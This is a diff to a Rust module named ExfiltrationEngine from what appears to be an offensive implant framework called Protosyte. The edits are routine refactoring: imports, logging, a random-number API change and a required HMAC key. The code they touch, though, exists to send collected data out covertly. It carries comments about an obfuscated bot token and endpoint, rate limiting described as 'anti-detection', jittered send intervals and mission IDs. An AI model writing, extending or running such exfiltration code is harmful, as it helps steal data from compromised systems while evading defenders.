@@ -5,15 +5,15 @@ use tokio::time::{sleep, Instant};
 use reqwest::Client;
 use zeroize::Zeroize;
 use std::env;
-use std::str::FromStr;
-use prost_types::Timestamp;
 
 use crate::crypto::CryptoManager;
-use crate::error_handling::{ProtosyteError, retry_with_backoff, RetryConfig, is_retryable_error};
-use crate::logging::{Logger, LogLevel};
-use crate::proto::{Envelope, DataBlob, envelope::Payload, data_blob::DataType};
-use crate::config::MissionConfig;
 use prost::Message;
+use prost_types::Timestamp;
+
+// Import proto types - use the re-exported types from proto module
+use crate::proto::protosyte::core::v2::{
+    Envelope, DataBlob, envelope::Payload, data_blob::DataType
+};
 
 // Obfuscated bot token and endpoint (in production, use compile-time obfuscation)
 fn get_bot_token() -> String {
@@ -49,8 +49,8 @@ pub struct ExfiltrationEngine {
 impl ExfiltrationEngine {
     pub fn new(crypto: Arc<CryptoManager>, data_rx: mpsc::UnboundedReceiver<Vec<u8>>) -> Self {
         // Load mission config
-        let config = crate::config::MissionConfig::load().unwrap_or_else(|_| {
-            crate::config::MissionConfig {
+        let config = crate::MissionConfig::load().unwrap_or_else(|_| {
+            crate::MissionConfig {
                 mission_id: 0xDEADBEEFCAFEBABE,
                 mission_name: "Default Mission".to_string(),
                 exfiltration_interval: 347,
@@ -162,14 +162,14 @@ impl ExfiltrationEngine {
                             let envelope_bytes = match envelope_result {
                                 Ok(bytes) => bytes,
                                 Err(e) => {
-                                    Logger::warn("EXFIL", &format!("Failed to create envelope: {}", e));
+                                    eprintln!("[EXFIL] Failed to create envelope: {}", e);
                                     continue;
                                 }
                             };
                             
                             // Rate limiting (anti-detection) - check before sending
                             if let Some(wait_time) = self.rate_limiter.acquire(envelope_bytes.len()).await {
-                                Logger::info("EXFIL", &format!("Rate limited: waiting {}ms", wait_time.as_millis()));
+                                eprintln!("[EXFIL] Rate limited: waiting {}ms", wait_time.as_millis());
                                 sleep(wait_time).await;
                             }
                             
@@ -184,12 +184,12 @@ impl ExfiltrationEngine {
                             
                             match send_result {
                                 Ok(_) => {
-                                    Logger::info("EXFIL", "Payload sent successfully");
+                                    eprintln!("[EXFIL] Payload sent successfully");
                                     self.rate_limiter.record_success(); // Update adaptive rate limiter
                                     last_send = Instant::now();
                                 }
                                 Err(e) => {
-                                    Logger::warn("EXFIL", &format!("Failed to send payload: {}. Will retry on next interval.", e));
+                                    eprintln!("[EXFIL] Failed to send payload: {}. Will retry on next interval.", e);
                                     self.rate_limiter.record_error(); // Back off on errors (adaptive)
                                     // Note: Retry logic can be added here or in send_payload itself
                                 }
@@ -208,7 +208,7 @@ impl ExfiltrationEngine {
     fn calculate_jitter(&self) -> Duration {
         use rand::Rng;
         let mut rng = rand::thread_rng();
-        let jitter_amount = rng.gen_range(-self.jitter..=self.jitter);
+        let jitter_amount = rng.random_range(-self.jitter..=self.jitter);
         let jitter_secs = (self.interval.as_secs_f32() * jitter_amount) as u64;
         Duration::from_secs(jitter_secs)
     }
@@ -219,7 +219,7 @@ impl ExfiltrationEngine {
         nonce: &[u8],
         original_size: u32,
     ) -> Result<Vec<u8>, String> {
-        use sha2::{Sha256, Digest};
+        use sha2::Sha256;
         use hmac::{Hmac, Mac};
         
         // Get next sequence number
@@ -250,15 +250,13 @@ impl ExfiltrationEngine {
         };
         
         // Compute HMAC over envelope fields (before HMAC field)
+        // Security: Require explicit key configuration, no defaults
         let hmac_key = env::var("PROTOSYTE_HMAC_KEY")
-            .unwrap_or_else(|_| {
-                // Derive from passphrase if available
-                env::var("PROTOSYTE_PASSPHRASE")
-                    .unwrap_or_else(|_| "default_key_change_in_production".to_string())
-            });
+            .or_else(|_| env::var("PROTOSYTE_PASSPHRASE"))
+            .expect("PROTOSYTE_HMAC_KEY or PROTOSYTE_PASSPHRASE must be set for security");
         
         // Create temporary envelope without HMAC for hashing
-        let mut hmac_envelope = Envelope {
+        let hmac_envelope = Envelope {
             mission_id: envelope.mission_id,
             collected_ts: envelope.collected_ts.clone(),
             sequence: envelope.sequence,
@@ -403,7 +401,7 @@ mod tests {
     async fn test_start_without_token() {
         let crypto = Arc::new(CryptoManager::new());
         let (_tx, rx) = mpsc::unbounded_channel();
-        let engine = ExfiltrationEngine::new(crypto, rx);
+        let _engine = ExfiltrationEngine::new(crypto, rx);
         
         std::env::remove_var("PROTOSYTE_BOT_TOKEN");
         // This should return early without panicking
